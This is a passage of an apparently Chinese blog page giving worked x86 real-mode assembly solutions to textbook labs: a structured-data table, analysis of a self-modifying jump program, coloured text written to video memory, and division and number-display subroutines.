class="line"><span class="keyword">and</span> <span class="built_in">al</span>, <span class="number">11011111b</span></div><div class="line"><span class="keyword">mov</span> [<span class="built_in">bx</span> + <span class="built_in">si</span> + <span class="number">3</span>], <span class="built_in">al</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">loop</span> s0</div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">16</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">loop</span> s</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line">codesg ends</div><div class="line">end start</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="实验7-寻址方式在结构化数据访问中的应用"><a href="#实验7-寻址方式在结构化数据访问中的应用" class="headerlink" title="实验7 寻址方式在结构化数据访问中的应用"></a>实验7 寻址方式在结构化数据访问中的应用</h2><p>编程，将data段中的数据按如下格式写入到table段中，并计算21年中的人均收入（取整），结果也按照下面的格式保存在table段中。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg, <span class="built_in">ss</span>:stack</div><div class="line"></div><div class="line">stack <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">8</span> dup (<span class="number">0</span>)</div><div class="line">stack ends</div><div class="line"></div><div class="line">data <span class="meta">segment</span></div><div class="line"><span class="built_in">db</span> <span class="string">'1975'</span>, <span class="string">'1976'</span>, <span class="string">'1977'</span>, <span class="string">'1978'</span>, <span class="string">'1979'</span>, <span class="string">'1980'</span>, <span class="string">'1981'</span>, <span class="string">'1982'</span>, <span class="string">'1983'</span></div><div class="line"><span class="built_in">db</span> <span class="string">'1984'</span>, <span class="string">'1985'</span>, <span class="string">'1986'</span>, <span class="string">'1987'</span>, <span class="string">'1988'</span>, <span class="string">'1989'</span>, <span class="string">'1990'</span>, <span class="string">'1991'</span>, <span class="string">'1992'</span></div><div class="line"><span class="built_in">db</span> <span class="string">'1993'</span>, <span class="string">'1994'</span>, <span class="string">'1995'</span></div><div class="line"></div><div class="line"><span class="built_in">dd</span> <span class="number">16</span>, <span class="number">22</span>, <span class="number">382</span>, <span class="number">1356</span>, <span class="number">2390</span>, <span class="number">8000</span>, <span class="number">16000</span>, <span class="number">24486</span>, <span class="number">50065</span>, <span class="number">97479</span>, <span class="number">140417</span>, <span class="number">197514</span></div><div class="line"><span class="built_in">dd</span> <span class="number">345980</span>, <span class="number">590827</span>, <span class="number">803530</span>, <span class="number">1183000</span>, <span class="number">1843000</span>, <span class="number">2759000</span>, <span class="number">3753000</span>, <span class="number">4649000</span>, <span class="number">5937000</span></div><div class="line"></div><div class="line"><span class="built_in">dw</span> <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">38</span>, <span class="number">130</span>, <span class="number">220</span>, <span class="number">476</span>, <span class="number">778</span>, <span class="number">1001</span>, <span class="number">1442</span>, <span class="number">2258</span>, <span class="number">2793</span>, <span class="number">4037</span>, <span class="number">5635</span>, <span class="number">8226</span></div><div class="line"><span class="built_in">dw</span> <span class="number">11542</span>, <span class="number">14430</span>, <span class="number">15257</span>, <span class="number">17800</span></div><div class="line">data ends</div><div class="line"></div><div class="line">table <span class="meta">segment</span></div><div class="line"><span class="built_in">db</span> <span class="number">21</span> dup (<span class="string">'year summ ne ?? '</span>)</div><div class="line">table ends</div><div class="line"></div><div class="line">codesg <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, table</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">21</span></div><div class="line"><span class="symbol">year:</span>   <span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">4</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">0</span></div><div class="line"><span class="symbol">char:</span>   <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">es</span>:[<span class="built_in">si</span>]</div><div class="line"><span class="keyword">mov</span> [<span class="built_in">bx</span>+<span class="built_in">di</span>], <span class="built_in">al</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">di</span></div><div class="line"><span class="keyword">loop</span> char</div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">16</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">loop</span> year</div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">21</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="symbol">income:</span> <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">es</span>:[<span class="built_in">si</span>]</div><div class="line"><span class="keyword">mov</span> [<span class="number">5</span>+<span class="built_in">bx</span>], <span class="built_in">ax</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">si</span>, <span class="number">2</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">es</span>:[<span class="built_in">si</span>]</div><div class="line"><span class="keyword">mov</span> [<span class="number">7</span>+<span class="built_in">bx</span>], <span class="built_in">ax</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">si</span>, <span class="number">2</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">16</span></div><div class="line"><span class="keyword">loop</span> income</div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">21</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="symbol">staff:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">es</span>:[<span class="built_in">si</span>]</div><div class="line"><span class="keyword">mov</span> [<span class="number">10</span>+<span class="built_in">bx</span>], <span class="built_in">ax</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">si</span>, <span class="number">2</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">16</span></div><div class="line"><span class="keyword">loop</span> staff</div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">21</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="symbol">average:</span><span class="keyword">mov</span> <span class="built_in">ax</span>, [<span class="built_in">bx</span>+<span class="number">5</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, [<span class="built_in">bx</span>+<span class="number">7</span>]</div><div class="line"><span class="keyword">div</span> <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">bx</span>+<span class="number">10</span>]</div><div class="line"><span class="keyword">mov</span> [<span class="number">13</span>+<span class="built_in">bx</span>], <span class="built_in">ax</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">16</span></div><div class="line"><span class="keyword">loop</span> average</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line">codesg ends</div><div class="line">end start</div></pre></td></tr></table></figure></p>
<h2 id="实验8-分析一个奇怪的程序"><a href="#实验8-分析一个奇怪的程序" class="headerlink" title="实验8 分析一个奇怪的程序"></a>实验8 分析一个奇怪的程序</h2><p>分析下面的程序，在运行前思考，这个程序可以正确返回吗？<br>运行后再思考：为什么是这种结果？<br>通过这个程序加深对相关内容的理解。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg</div><div class="line">codesg <span class="meta">segment</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol">start:</span> <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="symbol">s:</span>     <span class="keyword">nop</span></div><div class="line"><span class="keyword">nop</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, offset s</div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset s2</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span>:[<span class="built_in">si</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">cs</span>:[<span class="built_in">di</span>], <span class="built_in">ax</span></div><div class="line"><span class="symbol">s0:</span>    <span class="keyword">jmp</span> short s</div><div class="line"><span class="symbol">s1:</span>    <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="symbol">s2:</span>    <span class="keyword">jmp</span> short s1</div><div class="line"><span class="keyword">nop</span></div><div class="line">codesg ends</div><div class="line">end start</div></pre></td></tr></table></figure><br>分析：<br>这个程序可以正确返回，程序的入口为mov ax, 0，注意到指令jmp short s1占2字节，于是指令mov di, offset s将s的偏移地址传送到寄存器DI，mov si, offset s2将s2的偏移地址传送到SI，然后再通过通用寄存器ax做中转将s2处的指令复制到s处，最后再跳转至s处执行复制过来的指令。<br>注意jmp short s1是相对跳转，其直接修改IP寄存器，从s2到s1共有8个字节的偏移，实际上 jmp short s1等价于(ip)=(ip)-8，通过Debug可知第一个nop指令的偏移地址为8，所以再执行了复制过的指令后，IP将指向0，程序按照顺序执行mov ax, 4c00h和int 21h，正确返回。</p>
<h2 id="实验9-根据材料编程"><a href="#实验9-根据材料编程" class="headerlink" title="实验9 根据材料编程"></a>实验9 根据材料编程</h2><p>编程：在屏幕中间分别显示绿色、绿底红色、白底蓝色的字符串’welcome to masm!’。<br>编程所需的只是通过阅读、分析下面的材料获得。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">ds</span>:data, <span class="built_in">cs</span>:code</div><div class="line"></div><div class="line">data <span class="meta">segment</span></div><div class="line"><span class="built_in">db</span> <span class="string">'welcome to masm!'</span></div><div class="line">data ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0B800H</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">1664</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">16</span></div><div class="line"><span class="symbol">char1:</span>  <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">si</span>]</div><div class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">10000010B</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="built_in">ax</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">loop</span> char1</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">1824</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">16</span></div><div class="line"><span class="symbol">char2:</span>  <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">si</span>]</div><div class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">10100100B</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="built_in">ax</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">loop</span> char2</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">1984</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">16</span></div><div class="line"><span class="symbol">char3:</span>  <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">si</span>]</div><div class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">11110001B</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="built_in">ax</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">loop</span> char3</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4C00H</span></div><div class="line"><span class="keyword">int</span> <span class="number">21H</span></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure></p>
<h2 id="实验10-编写子程序"><a href="#实验10-编写子程序" class="headerlink" title="实验10 编写子程序"></a>实验10 编写子程序</h2><ol>
<li><p>显示字符串</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ss</span>:stack</div><div class="line"></div><div class="line">stack <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">16</span> dup (<span class="number">0</span>)</div><div class="line">stack ends</div><div class="line"></div><div class="line">data <span class="meta">segment</span></div><div class="line"><span class="built_in">db</span> <span class="string">'Welcome to masm!'</span>, <span class="number">0</span></div><div class="line">data ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="number">dh</span>, <span class="number">8</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">dl</span>, <span class="number">3</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">2</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, stack</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">32</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></div><div class="line"><span class="keyword">call</span> show_str</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol"></span></div><div class="line">show_str:</div><div class="line"><span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">di</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">es</span></div><div class="line"><span class="comment">;using cx, bx, ax, si, di, es</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0b800h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">160</span></div><div class="line"><span class="keyword">mul</span> <span class="number">dh</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">2</span></div><div class="line"><span class="keyword">mul</span> <span class="built_in">dl</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="built_in">ax</span> <span class="comment">;bx stores address of start character</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">cl</span> <span class="comment">;al stores the color of character</span></div><div class="line"><span class="symbol">char:</span>   <span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="built_in">ds</span>:[<span class="built_in">si</span>]</div><div class="line"><span class="keyword">jcxz</span> <span class="meta">zero</span></div><div class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="built_in">al</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>+<span class="built_in">di</span>], <span class="built_in">cx</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">di</span>, <span class="number">2</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">jmp</span> char</div><div class="line"><span class="symbol">zero:</span>   <span class="keyword">pop</span> <span class="built_in">es</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">di</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">ret</span></div><div class="line"></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure>
</li>
<li><p>解决除法溢出的问题</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ss</span>:stack</div><div class="line"></div><div class="line">stack <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">16</span> dup (<span class="number">0</span>)</div><div class="line">stack ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">32</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4240h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">000fh</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">0ah</span></div><div class="line"><span class="keyword">call</span> divdw</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol"></span></div><div class="line">divdw:  <span class="keyword">push</span> <span class="built_in">bx</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="built_in">ax</span> <span class="comment">; bx stores L</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">dx</span> <span class="comment">; ax stores H</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">div</span> <span class="built_in">cx</span> <span class="comment">; after div, ax holds int(H/N), dx holds rem(H/N)</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ax</span> <span class="comment">; push int(H/N) temporarily</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">bx</span> <span class="comment">; ax stores L</span></div><div class="line"><span class="keyword">div</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="built_in">dx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">dx</span></div><div class="line"></div><div class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">ret</span></div><div class="line"></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure>
</li>
<li><p>数值显示</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ss</span>:stack</div><div class="line"></div><div class="line">stack <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">16</span> dup (<span class="number">0</span>)</div><div class="line">stack ends</div><div class="line"></div><div class="line">data <span class="meta">segment</span></div><div class="line"><span class="built_in">db</span> <span class="number">10</span> dup (<span class="number">0</span>)</div><div class="line">data ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, stack</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">32</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">12666</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></div><div class="line"><span class="keyword">call</span> dtoc</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="number">dh</span>, <span class="number">8</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">dl</span>, <span class="number">3</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">2</span></div><div class="line"><span class="keyword">call</span> show_str</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol"></span></div><div class="line">dtoc:   <span class="keyword">push</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">di</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">dx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">10</span></div><div class="line"><span class="symbol"></span></div><div class="line">devide: <span class="keyword">mov</span> <span 